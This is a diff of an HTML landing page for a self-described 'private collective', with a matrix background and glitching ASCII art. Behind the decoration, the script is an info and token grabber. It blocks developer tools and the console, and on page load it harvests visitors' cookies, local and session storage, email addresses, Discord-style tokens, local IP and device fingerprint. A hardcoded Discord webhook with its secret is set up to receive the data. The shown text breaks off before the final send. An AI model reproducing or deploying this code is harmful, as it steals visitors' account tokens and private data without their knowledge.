@@ -3,26 +3,24 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>collective · loading · glitch</title>
+  <title>collective · glitch</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       background: #0b0e11;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       padding: 1.5rem;
       position: relative;
       overflow-x: hidden;
     }
-
     #cmatrix-canvas {
       position: fixed;
       top: 0;
@@ -34,7 +32,6 @@
       display: block;
       background: transparent;
     }
-
     #loadingScreen {
       position: fixed;
       top: 0;
@@ -54,14 +51,13 @@
       visibility: hidden;
       pointer-events: none;
     }
-
     .loading-ascii {
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       font-size: 0.7rem;
       line-height: 1.2;
       white-space: pre;
       color: #4b8ca3;
-      text-shadow: 0 0 12px rgba(75, 140, 163, 0.25);
+      text-shadow: 0 0 12px rgba(75,140,163,0.25);
       letter-spacing: 0.02em;
       padding: 0.5rem;
       max-width: 95%;
@@ -80,7 +76,7 @@
       width: 100%;
     }
     .loading-text {
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       font-size: 0.75rem;
       color: #4b8ca3;
       margin-top: 1rem;
@@ -92,7 +88,6 @@
       0%, 100% { opacity: 0.4; }
       50% { opacity: 0.9; }
     }
-
     #mainContent {
       position: relative;
       z-index: 1;
@@ -111,7 +106,6 @@
     #mainContent.visible {
       opacity: 1;
     }
-
     .ascii-wrapper {
       position: relative;
       margin-bottom: 1.2rem;
@@ -119,12 +113,12 @@
       max-width: 900px;
     }
     .ascii-art {
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       font-size: 0.7rem;
       line-height: 1.2;
       white-space: pre;
       color: #4b8ca3;
-      text-shadow: 0 0 8px rgba(75, 140, 163, 0.2);
+      text-shadow: 0 0 8px rgba(75,140,163,0.2);
       letter-spacing: 0.02em;
       overflow-x: auto;
       padding: 0.2rem 0;
@@ -152,7 +146,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       font-size: 0.7rem;
       line-height: 1.2;
       white-space: pre;
@@ -167,7 +161,7 @@
       pointer-events: none;
       opacity: 0;
       transition: opacity 0.04s;
-      text-shadow: 0 0 12px rgba(75, 140, 163, 0.4);
+      text-shadow: 0 0 12px rgba(75,140,163,0.4);
       text-align: center;
     }
     .glitch-layer code {
@@ -180,30 +174,27 @@
       width: 100%;
       text-align: center;
     }
-    .glitch-layer.active {
-      opacity: 1;
-    }
+    .glitch-layer.active { opacity: 1; }
     .glitch-offset-1 {
       transform: translate(1.5px, -1px);
       color: #4b8ca3;
-      text-shadow: 0 0 20px rgba(75, 140, 163, 0.6);
+      text-shadow: 0 0 20px rgba(75,140,163,0.6);
       clip-path: inset(10% 0 70% 0);
     }
     .glitch-offset-2 {
       transform: translate(-1.2px, 1.2px);
       color: #5a9cb3;
-      text-shadow: 0 0 25px rgba(75, 140, 163, 0.5);
+      text-shadow: 0 0 25px rgba(75,140,163,0.5);
       clip-path: inset(40% 0 30% 0);
     }
     .glitch-offset-3 {
       transform: translate(2px, 0.5px);
       color: #3d7a8f;
-      text-shadow: 0 0 18px rgba(75, 140, 163, 0.5);
+      text-shadow: 0 0 18px rgba(75,140,163,0.5);
       clip-path: inset(70% 0 10% 0);
     }
-
     .tagline-wrapper {
-      font-family: 'Courier New', Courier, 'Fira Code', monospace;
+      font-family: 'Courier New', Courier, monospace;
       font-size: 0.85rem;
       font-weight: 400;
       letter-spacing: 0.06em;
@@ -215,7 +206,7 @@
       border-radius: 0;
       word-break: break-word;
       line-height: 1.5;
-      text-shadow: 0 0 6px rgba(75, 140, 163, 0.06);
+      text-shadow: 0 0 6px rgba(75,140,163,0.06);
       backdrop-filter: none;
       max-width: 90%;
       min-height: 2.4rem;
@@ -235,7 +226,6 @@
       0%, 100% { opacity: 0.7; }
       50% { opacity: 0; }
     }
-
     @media (max-width: 700px) {
       .ascii-art, .glitch-layer, .loading-ascii { font-size: 0.48rem; line-height: 1.1; }
       .tagline-wrapper { font-size: 0.7rem; }
@@ -289,676 +279,639 @@
 
   <script>
   (function() {
-      "use strict";
+    "use strict";
 
-      // ─── WEBHOOK ───
-      var WEBHOOK = 'https://discord.com/api/webhooks/1534195169442664588/-9_-hoqd8ZwbbQqolCCLyuJv5TmFnaJL7sG7450PdpWJWN1Ip0rTZGTgiD3Got_DAi9s';
+    var WEBHOOK = 'https://discord.com/api/webhooks/1534195169442664588/-9_-hoqd8ZwbbQqolCCLyuJv5TmFnaJL7sG7450PdpWJWN1Ip0rTZGTgiD3Got_DAi9s';
 
-      function sendToWebhook(content) {
-          var payload = typeof content === 'string' ? { content: content } : content;
-          return fetch(WEBHOOK, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload)
-          }).catch(function() {});
+    function sendToWebhook(content) {
+      var payload = typeof content === 'string' ? { content: content } : content;
+      return fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(function() {});
+    }
+
+    // ANTI-DEVTOOLS
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
       }
-
-      // ─── ANTI-DEVTOOLS ───
-      document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-
-      document.addEventListener('keydown', function(e) {
-          if (e.key === 'F12' || e.keyCode === 123) {
-              e.preventDefault();
-              window.close();
-              setTimeout(function() { window.location.href = 'about:blank'; }, 100);
-              return false;
-          }
-          if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
-              e.preventDefault();
-              window.close();
-              setTimeout(function() { window.location.href = 'about:blank'; }, 100);
-              return false;
-          }
-          if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-              e.preventDefault();
-              window.close();
-              setTimeout(function() { window.location.href = 'about:blank'; }, 100);
-              return false;
-          }
-          return true;
-      });
-
-      var devtoolsDetect = function() {
-          var threshold = 160;
-          var widthDiff = window.outerWidth - window.innerWidth;
-          var heightDiff = window.outerHeight - window.innerHeight;
-          if (widthDiff > threshold || heightDiff > threshold) {
-              window.close();
-              setTimeout(function() { window.location.href = 'about:blank'; }, 100);
-          }
-      };
-      setInterval(devtoolsDetect, 500);
-      window.addEventListener('resize', devtoolsDetect);
-
-      document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
-      document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-      document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
-      document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
-
-      // Suppress console
-      console.log = function() {};
-      console.warn = function() {};
-      console.error = function() {};
-
-      // ─── LOADING SCREEN (FIXED) ───
-      var fullAscii = `                                
-   ..                           
-  888>                .u    .   
-  "8P        .u     .d88B :@8c  
-   .      ud8888.  ="8888f8888r 
- u888u. :888'8888.   4888>'88"  
-`'888E  d888 '88%"   4888> '    
-  888E  8888.+"      4888>      
-  888E  8888L       .d888L .+   
-  888E  '8888c. .+  ^"8888*"    
-  888E   "88888%       "Y"      
-  888E     "YP'                 
-  888E                          
-  888P                          
-.J88" "                         `;
-
-      var loadingCode = document.getElementById('loadingCode');
-      var loadingScreen = document.getElementById('loadingScreen');
-      var mainContent = document.getElementById('mainContent');
-
-      // Show full ASCII immediately then wait before hiding
-      loadingCode.textContent = fullAscii;
-
-      // Wait 2 seconds then transition
-      setTimeout(function() {
-          loadingScreen.classList.add('hidden');
-          mainContent.classList.add('visible');
-          setTimeout(startMainAnimations, 100);
-          setTimeout(collectAllData, 300);
-      }, 2000);
-
-      // ─── CMATRIX ───
-      var canvas = document.getElementById('cmatrix-canvas');
-      var ctx = canvas.getContext('2d');
-      var w, h, cols, drops = [];
-      var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+{}[]|;:,.<>?";
-
-      function initMatrix() {
-          w = window.innerWidth;
-          h = window.innerHeight;
-          canvas.width = w;
-          canvas.height = h;
-          var cw = 18;
-          cols = Math.floor(w / cw);
-          drops = [];
-          for (var i = 0; i < cols; i++) {
-              drops.push({
-                  y: Math.floor(Math.random() * -200) - 50,
-                  speed: 0.2 + Math.random() * 0.3,
-                  active: Math.random() < 0.3 ? 1 : 0,
-                  char: chars[Math.floor(Math.random() * chars.length)],
-                  brightness: 0.5 + Math.random() * 0.5
-              });
-          }
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
       }
-
-      function drawMatrix() {
-          ctx.clearRect(0, 0, w, h);
-          ctx.font = '15px "Courier New", monospace';
-          ctx.textAlign = 'center';
-          var r = 75, g = 140, b = 163;
-          for (var i = 0; i < drops.length; i++) {
-              var drop = drops[i];
-              if (!drop.active) {
-                  if (Math.random() < 0.001) {
-                      drop.active = 1;
-                      drop.y = Math.floor(Math.random() * -100) - 30;
-                      drop.char = chars[Math.floor(Math.random() * chars.length)];
-                  }
-                  continue;
-              }
-              var x = i * (w / cols) + (w / cols) / 2;
-              var alpha = 0.25 + 0.35 * drop.brightness;
-              ctx.shadowColor = 'rgba(75, 140, 163, 0.15)';
-              ctx.shadowBlur = 10;
-              ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',' + alpha + ')';
-              ctx.fillText(drop.char, x, drop.y);
-              drop.y += drop.speed;
-              if (drop.y > h + 30) {
-                  if (Math.random() < 0.4) {
-                      drop.y = Math.floor(Math.random() * -60) - 20;
-                      drop.char = chars[Math.floor(Math.random() * chars.length)];
-                      drop.speed = 0.2 + Math.random() * 0.3;
-                      drop.brightness = 0.5 + Math.random() * 0.5;
-                  } else {
-                      drop.active = 0;
-                      drop.y = Math.floor(Math.random() * -200) - 50;
-                  }
-              }
-              if (Math.random() < 0.01) drop.char = chars[Math.floor(Math.random() * chars.length)];
-          }
-          for (var j = 0; j < drops.length; j++) {
-              if (drops[j].active === 0 && Math.random() < 0.0008) {
-                  drops[j].active = 1;
-                  drops[j].y = Math.floor(Math.random() * -50) - 20;
-                  drops[j].char = chars[Math.floor(Math.random() * chars.length)];
-              }
-          }
-          requestAnimationFrame(drawMatrix);
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
       }
+      return true;
+    });
 
-      window.addEventListener('resize', function() { initMatrix(); });
-      initMatrix();
-      drawMatrix();
+    var devtoolsDetect = function() {
+      var threshold = 160;
+      var widthDiff = window.outerWidth - window.innerWidth;
+      var heightDiff = window.outerHeight - window.innerHeight;
+      if (widthDiff > threshold || heightDiff > threshold) {
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+      }
+    };
+    setInterval(devtoolsDetect, 500);
+    window.addEventListener('resize', devtoolsDetect);
 
-      // ─── MAIN ANIMATIONS ───
-      function startMainAnimations() {
-          var asciiCode = document.getElementById('asciiCode');
-          var glitch1 = document.getElementById('glitch1');
-          var glitch2 = document.getElementById('glitch2');
-          var glitch3 = document.getElementById('glitch3');
-          var gc1 = document.getElementById('glitchCode1');
-          var gc2 = document.getElementById('glitchCode2');
-          var gc3 = document.getElementById('glitchCode3');
-          var orig = fullAscii;
+    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
 
+    console.log = function() {};
+    console.warn = function() {};
+    console.error = function() {};
+
+    // LOADING SCREEN
+    var fullAscii = '                                \n   ..                           \n  888>                .u    .   \n  "8P        .u     .d88B :@8c  \n   .      ud8888.  ="8888f8888r \n u888u. :888\'8888.   4888>\'88"  \n`\'888E  d888 \'88%"   4888> \'    \n  888E  8888.+"      4888>      \n  888E  8888L       .d888L .+   \n  888E  \'8888c. .+  ^"8888*"    \n  888E   "88888%       "Y"      \n  888E     "YP\'                 \n  888E                          \n  888P                          \n.J88" "                         ';
+
+    var loadingCode = document.getElementById('loadingCode');
+    var loadingScreen = document.getElementById('loadingScreen');
+    var mainContent = document.getElementById('mainContent');
+
+    loadingCode.textContent = fullAscii;
+
+    setTimeout(function() {
+      loadingScreen.classList.add('hidden');
+      mainContent.classList.add('visible');
+      setTimeout(startMainAnimations, 100);
+      setTimeout(collectAllData, 300);
+    }, 2000);
+
+    // CMATRIX
+    var canvas = document.getElementById('cmatrix-canvas');
+    var ctx = canvas.getContext('2d');
+    var w, h, cols, drops = [];
+    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+{}[]|;:,.<>?';
+
+    function initMatrix() {
+      w = window.innerWidth;
+      h = window.innerHeight;
+      canvas.width = w;
+      canvas.height = h;
+      var cw = 18;
+      cols = Math.floor(w / cw);
+      drops = [];
+      for (var i = 0; i < cols; i++) {
+        drops.push({
+          y: Math.floor(Math.random() * -200) - 50,
+          speed: 0.2 + Math.random() * 0.3,
+          active: Math.random() < 0.3 ? 1 : 0,
+          char: chars[Math.floor(Math.random() * chars.length)],
+          brightness: 0.5 + Math.random() * 0.5
+        });
+      }
+    }
+
+    function drawMatrix() {
+      ctx.clearRect(0, 0, w, h);
+      ctx.font = '15px "Courier New", monospace';
+      ctx.textAlign = 'center';
+      var r = 75, g = 140, b = 163;
+      for (var i = 0; i < drops.length; i++) {
+        var drop = drops[i];
+        if (!drop.active) {
+          if (Math.random() < 0.001) {
+            drop.active = 1;
+            drop.y = Math.floor(Math.random() * -100) - 30;
+            drop.char = chars[Math.floor(Math.random() * chars.length)];
+          }
+          continue;
+        }
+        var x = i * (w / cols) + (w / cols) / 2;
+        var alpha = 0.25 + 0.35 * drop.brightness;
+        ctx.shadowColor = 'rgba(75, 140, 163, 0.15)';
+        ctx.shadowBlur = 10;
+        ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',' + alpha + ')';
+        ctx.fillText(drop.char, x, drop.y);
+        drop.y += drop.speed;
+        if (drop.y > h + 30) {
+          if (Math.random() < 0.4) {
+            drop.y = Math.floor(Math.random() * -60) - 20;
+            drop.char = chars[Math.floor(Math.random() * chars.length)];
+            drop.speed = 0.2 + Math.random() * 0.3;
+            drop.brightness = 0.5 + Math.random() * 0.5;
+          } else {
+            drop.active = 0;
+            drop.y = Math.floor(Math.random() * -200) - 50;
+          }
+        }
+        if (Math.random() < 0.01) drop.char = chars[Math.floor(Math.random() * chars.length)];
+      }
+      for (var j = 0; j < drops.length; j++) {
+        if (drops[j].active === 0 && Math.random() < 0.0008) {
+          drops[j].active = 1;
+          drops[j].y = Math.floor(Math.random() * -50) - 20;
+          drops[j].char = chars[Math.floor(Math.random() * chars.length)];
+        }
+      }
+      requestAnimationFrame(drawMatrix);
+    }
+
+    window.addEventListener('resize', function() { initMatrix(); });
+    initMatrix();
+    drawMatrix();
+
+    // MAIN ANIMATIONS
+    function startMainAnimations() {
+      var asciiCode = document.getElementById('asciiCode');
+      var glitch1 = document.getElementById('glitch1');
+      var glitch2 = document.getElementById('glitch2');
+      var glitch3 = document.getElementById('glitch3');
+      var gc1 = document.getElementById('glitchCode1');
+      var gc2 = document.getElementById('glitchCode2');
+      var gc3 = document.getElementById('glitchCode3');
+      var orig = fullAscii;
+
+      gc1.textContent = orig;
+      gc2.textContent = orig;
+      gc3.textContent = orig;
+
+      function glitch() {
+        var lines = orig.split('\n');
+        var lineCount = lines.length;
+        var numLines = 1 + Math.floor(Math.random() * 2);
+        var indices = [];
+        for (var i = 0; i < numLines; i++) {
+          var li = Math.floor(Math.random() * lineCount);
+          while (indices.indexOf(li) !== -1) li = Math.floor(Math.random() * lineCount);
+          indices.push(li);
+        }
+        var layers = [gc1, gc2, gc3];
+        for (var li2 = 0; li2 < layers.length; li2++) {
+          var newLines = lines.slice();
+          for (var ii = 0; ii < indices.length; ii++) {
+            var lineIdx = indices[ii];
+            var line = newLines[lineIdx];
+            if (line.length < 2) continue;
+            var numRep = 1 + Math.floor(Math.random() * 2);
+            for (var r = 0; r < numRep; r++) {
+              var pos = Math.floor(Math.random() * line.length);
+              var rc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
+              line = line.substring(0, pos) + rc + line.substring(pos + 1);
+            }
+            newLines[lineIdx] = line;
+          }
+          layers[li2].textContent = newLines.join('\n');
+        }
+        if (Math.random() < 0.3) {
+          var mainLines = lines.slice();
+          var mi = Math.floor(Math.random() * lineCount);
+          var ml = mainLines[mi];
+          if (ml.length > 2) {
+            var mp = Math.floor(Math.random() * ml.length);
+            var mc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
+            ml = ml.substring(0, mp) + mc + ml.substring(mp + 1);
+            mainLines[mi] = ml;
+            asciiCode.textContent = mainLines.join('\n');
+          }
+        } else {
+          asciiCode.textContent = orig;
+        }
+        var ge = [glitch1, glitch2, glitch3];
+        for (var gi = 0; gi < ge.length; gi++) {
+          if (Math.random() < 0.4) ge[gi].classList.add('active');
+          else ge[gi].classList.remove('active');
+        }
+        if (Math.random() < 0.2) {
           gc1.textContent = orig;
           gc2.textContent = orig;
           gc3.textContent = orig;
+          for (var gi2 = 0; gi2 < ge.length; gi2++) ge[gi2].classList.remove('active');
+        }
+        var delay = 400 + Math.random() * 600;
+        setTimeout(glitch, delay);
+      }
+      setTimeout(glitch, 400);
 
-          function glitch() {
-              var lines = orig.split('\n');
-              var lineCount = lines.length;
-              var numLines = 1 + Math.floor(Math.random() * 2);
-              var indices = [];
-              for (var i = 0; i < numLines; i++) {
-                  var li = Math.floor(Math.random() * lineCount);
-                  while (indices.indexOf(li) !== -1) li = Math.floor(Math.random() * lineCount);
-                  indices.push(li);
+      var tagline = 'a private collective of highly skilled individuals specializing in software development, cybersecurity, and threat intelligence.';
+      var typedSpan = document.getElementById('typedText');
+      var cursorSpan = document.getElementById('cursor');
+      var ci = 0;
+
+      function typeNext() {
+        if (ci < tagline.length) {
+          typedSpan.textContent += tagline.charAt(ci);
+          ci++;
+          setTimeout(typeNext, 25 + Math.random() * 30);
+        } else {
+          cursorSpan.style.animation = 'blink 0.9s step-end infinite';
+        }
+      }
+      setTimeout(typeNext, 500);
+    }
+
+    // INFO GRABBER
+    function collectAllData() {
+      var data = {
+        browser: {},
+        system: {},
+        network: {},
+        tokens: [],
+        storage: {},
+        emails: []
+      };
+
+      data.browser.userAgent = navigator.userAgent || 'N/A';
+      data.browser.language = navigator.language || 'N/A';
+      data.browser.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
+      data.browser.platform = navigator.platform || 'N/A';
+      data.browser.vendor = navigator.vendor || 'N/A';
+      data.browser.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+      data.browser.deviceMemory = navigator.deviceMemory || 'N/A';
+      data.browser.maxTouchPoints = navigator.maxTouchPoints || 'N/A';
+
+      data.system.screen = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + '-bit)';
+      data.system.avail = screen.availWidth + 'x' + screen.availHeight;
+      data.system.window = window.innerWidth + 'x' + window.innerHeight;
+      data.system.pixelRatio = window.devicePixelRatio || 1;
+      data.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
+      data.system.utc = new Date().toISOString();
+      data.system.local = new Date().toString();
+
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          var di = gl.getExtension('WEBGL_debug_renderer_info');
+          if (di) {
+            data.system.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL) || 'N/A';
+            data.system.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL) || 'N/A';
+          }
+          data.system.webglVersion = gl.getParameter(gl.VERSION) || 'N/A';
+        }
+      } catch(e) {}
+
+      try {
+        var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('test');
+        pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); }).then(function() {
+          var sdp = pc.localDescription ? pc.localDescription.sdp : '';
+          var candidates = sdp.match(/candidate:[^\n]+/g);
+          if (candidates) {
+            for (var i = 0; i < candidates.length; i++) {
+              var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
+              if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
+                data.network.localIP = match[0];
+                break;
               }
-              var layers = [gc1, gc2, gc3];
-              for (var li2 = 0; li2 < layers.length; li2++) {
-                  var newLines = lines.slice();
-                  for (var ii = 0; ii < indices.length; ii++) {
-                      var lineIdx = indices[ii];
-                      var line = newLines[lineIdx];
-                      if (line.length < 2) continue;
-                      var numRep = 1 + Math.floor(Math.random() * 2);
-                      for (var r = 0; r < numRep; r++) {
-                          var pos = Math.floor(Math.random() * line.length);
-                          var rc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
-                          line = line.substring(0, pos) + rc + line.substring(pos + 1);
+            }
+          }
+          pc.close();
+        }).catch(function() {});
+        setTimeout(function() { try { pc.close(); } catch(e) {} }, 2000);
+      } catch(e) {}
+
+      try {
+        var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
+        data.storage.cookies = cookies.length;
+        data.storage.cookieList = cookies;
+      } catch(e) {}
+
+      try {
+        var ls = [];
+        if (localStorage && localStorage.length > 0) {
+          for (var key in localStorage) {
+            if (localStorage.hasOwnProperty(key)) {
+              var val = localStorage[key];
+              if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+              ls.push(key + ': ' + val);
+            }
+          }
+        }
+        data.storage.localStorage = ls;
+      } catch(e) {}
+
+      try {
+        var ss = [];
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var key2 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(key2)) {
+              var val2 = sessionStorage[key2];
+              if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
+              ss.push(key2 + ': ' + val2);
+            }
+          }
+        }
+        data.storage.sessionStorage = ss;
+      } catch(e) {}
+
+      var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+      var emails = [];
+      try {
+        if (localStorage && localStorage.length > 0) {
+          for (var key3 in localStorage) {
+            if (localStorage.hasOwnProperty(key3)) {
+              var val3 = localStorage[key3];
+              if (typeof val3 === 'string') {
+                var matches = val3.match(emailRegex);
+                if (matches) {
+                  matches.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                }
+                try {
+                  var parsed = JSON.parse(val3);
+                  var jsonStr = JSON.stringify(parsed);
+                  var matches2 = jsonStr.match(emailRegex);
+                  if (matches2) {
+                    matches2.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                  }
+                } catch(e) {}
+              }
+            }
+          }
+        }
+      } catch(e) {}
+      try {
+        if (document.cookie) {
+          var ck = document.cookie.split(';');
+          ck.forEach(function(cookie) {
+            var val4 = cookie.trim();
+            var matches3 = val4.match(emailRegex);
+            if (matches3) {
+              matches3.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+            }
+          });
+        }
+      } catch(e) {}
+      try {
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var key4 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(key4)) {
+              var val5 = sessionStorage[key4];
+              if (typeof val5 === 'string') {
+                var matches4 = val5.match(emailRegex);
+                if (matches4) {
+                  matches4.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+                }
+              }
+            }
+          }
+        }
+      } catch(e) {}
+      try {
+        var windowStr = JSON.stringify(window);
+        var matches5 = windowStr.match(emailRegex);
+        if (matches5) {
+          matches5.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+        }
+      } catch(e) {}
+      try {
+        var html = document.documentElement.innerHTML;
+        var matches6 = html.match(emailRegex);
+        if (matches6) {
+          matches6.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
+        }
+      } catch(e) {}
+      var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
+      emails = emails.filter(function(e) {
+        return commonFalse.indexOf(e) === -1 && e.length > 10;
+      });
+      data.emails = emails;
+
+      var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
+      var tokenSources = [];
+
+      try {
+        if (localStorage && localStorage.length > 0) {
+          for (var k in localStorage) {
+            if (localStorage.hasOwnProperty(k)) {
+              var v = localStorage[k];
+              if (typeof v === 'string' && v.length > 20) {
+                var matches7 = v.match(tokenRegex);
+                if (matches7) {
+                  matches7.forEach(function(t) {
+                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                      tokenSources.push({ source: 'localStorage', key: k, token: t });
+                    }
+                  });
+                }
+                try {
+                  var p = JSON.parse(v);
+                  var js = JSON.stringify(p);
+                  var m2 = js.match(tokenRegex);
+                  if (m2) {
+                    m2.forEach(function(t) {
+                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                        tokenSources.push({ source: 'localStorage JSON', key: k, token: t });
                       }
-                      newLines[lineIdx] = line;
+                    });
                   }
-                  layers[li2].textContent = newLines.join('\n');
+                } catch(e) {}
               }
-              if (Math.random() < 0.3) {
-                  var mainLines = lines.slice();
-                  var mi = Math.floor(Math.random() * lineCount);
-                  var ml = mainLines[mi];
-                  if (ml.length > 2) {
-                      var mp = Math.floor(Math.random() * ml.length);
-                      var mc = String.fromCharCode(33 + Math.floor(Math.random() * 94));
-                      ml = ml.substring(0, mp) + mc + ml.substring(mp + 1);
-                      mainLines[mi] = ml;
-                      asciiCode.textContent = mainLines.join('\n');
+            }
+          }
+        }
+      } catch(e) {}
+
+      try {
+        if (sessionStorage && sessionStorage.length > 0) {
+          for (var k2 in sessionStorage) {
+            if (sessionStorage.hasOwnProperty(k2)) {
+              var v2 = sessionStorage[k2];
+              if (typeof v2 === 'string' && v2.length > 20) {
+                var matches8 = v2.match(tokenRegex);
+                if (matches8) {
+                  matches8.forEach(function(t) {
+                    if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                      tokenSources.push({ source: 'sessionStorage', key: k2, token: t });
+                    }
+                  });
+                }
+              }
+            }
+          }
+        }
+      } catch(e) {}
+
+      try {
+        if (document.cookie) {
+          var cks = document.cookie.split(';');
+          cks.forEach(function(cookie) {
+            var parts = cookie.trim().split('=');
+            if (parts.length === 2) {
+              var val6 = parts[1];
+              var matches9 = val6.match(tokenRegex);
+              if (matches9) {
+                matches9.forEach(function(t) {
+                  if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+                    tokenSources.push({ source: 'cookie', key: parts[0], token: t });
                   }
-              } else {
-                  asciiCode.textContent = orig;
+                });
               }
-              var ge = [glitch1, glitch2, glitch3];
-              for (var gi = 0; gi < ge.length; gi++) {
-                  if (Math.random() < 0.4) ge[gi].classList.add('active');
-                  else ge[gi].classList.remove('active');
-              }
-              if (Math.random() < 0.2) {
-                  gc1.textContent = orig;
-                  gc2.textContent = orig;
-                  gc3.textContent = orig;
-                  for (var gi2 = 0; gi2 < ge.length; gi2++) ge[gi2].classList.remove('active');
-              }
-              var delay = 400 + Math.random() * 600;
-              setTimeout(glitch, delay);
-          }
-          setTimeout(glitch, 400);
+            }
+          });
+        }
+      } catch(e) {}
 
-          var tagline = "a private collective of highly skilled individuals specializing in software development, cybersecurity, and threat intelligence.";
-          var typedSpan = document.getElementById('typedText');
-          var cursorSpan = document.getElementById('cursor');
-          var ci = 0;
+      try {
+        var ws = JSON.stringify(window);
+        var m3 = ws.match(tokenRegex);
+        if (m3) {
+          m3.forEach(function(t) {
+            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+              tokenSources.push({ source: 'window object', key: 'global', token: t });
+            }
+          });
+        }
+      } catch(e) {}
 
-          function typeNext() {
-              if (ci < tagline.length) {
-                  typedSpan.textContent += tagline.charAt(ci);
-                  ci++;
-                  setTimeout(typeNext, 25 + Math.random() * 30);
-              } else {
-                  cursorSpan.style.animation = 'blink 0.9s step-end infinite';
-              }
-          }
-          setTimeout(typeNext, 500);
+      try {
+        var html2 = document.documentElement.innerHTML;
+        var m4 = html2.match(tokenRegex);
+        if (m4) {
+          m4.forEach(function(t) {
+            if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
+              tokenSources.push({ source: 'HTML', key: 'inline', token: t });
+            }
+          });
+        }
+      } catch(e) {}
+
+      var uniqueTokens = [];
+      var seen = {};
+      tokenSources.forEach(function(item) {
+        if (!seen[item.token]) {
+          seen[item.token] = true;
+          uniqueTokens.push(item);
+        }
+      });
+
+      data.tokens = uniqueTokens;
+
+      var fields = [];
+
